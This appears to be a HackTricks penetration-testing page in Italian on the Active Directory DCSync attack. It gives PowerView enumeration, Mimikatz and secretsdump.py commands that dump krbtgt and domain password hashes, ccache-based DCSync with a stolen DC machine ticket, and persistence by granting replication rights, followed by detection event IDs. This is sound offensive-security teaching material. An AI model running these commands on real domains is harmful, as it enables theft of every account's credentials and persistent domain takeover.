# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Il permesso **DCSync** implica il possesso di questi permessi sul dominio stesso: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Note importanti su DCSync:**

- L'**attacco DCSync simula il comportamento di un Domain Controller e chiede ad altri Domain Controller di replicare le informazioni** usando il Directory Replication Service Remote Protocol (MS-DRSR). Poiché MS-DRSR è una funzione valida e necessaria di Active Directory, non può essere disattivata o disabilitata.
- Per impostazione predefinita, solo i gruppi **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** dispongono dei privilegi necessari.
- In pratica, il **DCSync completo** richiede **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** sul contesto di denominazione del dominio. `DS-Replication-Get-Changes-In-Filtered-Set` viene comunemente delegato insieme a questi, ma da solo è più rilevante per sincronizzare **attributi riservati / filtrati per RODC** (ad esempio, segreti legacy in stile LAPS) che per un dump completo di krbtgt.<sup>[[2]](#references)</sup>
- Se le password di alcuni account sono archiviate con crittografia reversibile, in Mimikatz è disponibile un'opzione per restituire la password in testo normale

### Enumerazione

Verifica chi dispone di questi permessi usando `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Se vuoi concentrarti sui **principal non predefiniti** con diritti DCSync, escludi i gruppi integrati abilitati alla replica e verifica solo le entità fidate impreviste:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit localmente

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Sfruttamento da remoto

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Esempi pratici circoscritti:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync usando un TGT della macchina DC acquisito (ccache)

Quando esamini un servizio su un controller di dominio, distingui la sua identità locale da quella di rete. [Microsoft documenta](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) che gli account virtuali di SQL Server (`NT SERVICE\...`) accedono alle risorse di rete usando l'account computer dell'host. Su un controller di dominio, questo può rendere rilevante l'account macchina del DC nella verifica dei diritti di replica, ma un foothold su un servizio non dimostra da solo che sia possibile esportare un TGT macchina o usare l'autenticazione DCSync. Verifica l'identità effettiva del servizio, il contesto di autenticazione in uscita, i ticket o le credenziali disponibili e i diritti di replica effettivi prima di considerare questo percorso.

Negli scenari in modalità export con delega non vincolata, potresti acquisire un TGT della macchina del Domain Controller (ad esempio, `DC1$@DOMAIN` per `krbtgt@DOMAIN`). Puoi quindi usare quel ccache per autenticarti come DC ed eseguire DCSync senza password.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Note operative:

- **Il percorso Kerberos di Impacket tocca prima SMB** della chiamata DRSUAPI. Se l'ambiente applica la **convalida del nome target SPN**, un dump completo potrebbe non riuscire con `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In tal caso, richiedi prima un ticket di servizio **`cifs/<dc>`** per il DC di destinazione oppure usa **`-just-dc-user`** per l'account che ti serve subito.
- Quando disponi solo di privilegi di replica inferiori, la sincronizzazione di tipo LDAP/DirSync può comunque esporre attributi **confidential** o **filtrati per RODC** (ad esempio il legacy `ms-Mcs-AdmPwd`) senza una replica completa di krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` genera 3 file:

- uno con gli **hash NTLM**
- uno con le **chiavi Kerberos**
- uno con le password in testo in chiaro provenienti da NTDS per tutti gli account per cui è abilitata la [**crittografia reversibile**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Puoi trovare gli utenti con la crittografia reversibile usando a seguire

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Se sei un domain admin, puoi concedere queste autorizzazioni a qualsiasi utente con l'aiuto di PowerView:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Gli operatori Linux possono fare lo stesso con `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Quindi, puoi **verificare se all’utente sono stati assegnati correttamente i 3 privilegi**, cercandoli nell’output di (dovresti riuscire a vedere i nomi dei privilegi nel campo "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Mitigazione

- ID evento di sicurezza 4662 (deve essere abilitato il criterio di controllo per l'oggetto) – È stata eseguita un'operazione su un oggetto<sup>[[4]](#references)</sup>
- ID evento di sicurezza 5136 (deve essere abilitato il criterio di controllo per l'oggetto) – È stato modificato un oggetto del servizio directory
- ID evento di sicurezza 4670 (deve essere abilitato il criterio di controllo per l'oggetto) – Sono state modificate le autorizzazioni di un oggetto
- AD ACL Scanner - Creare e confrontare report degli ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Registro delle modifiche di Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: sfruttare Get-Changes e Get-Changes-In-Filtered-Set della replica](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: estrarre gli hash delle password da un Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — credenziali SYSVOL → Kerberoast mirato → delega non vincolata → DCSync per ottenere DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
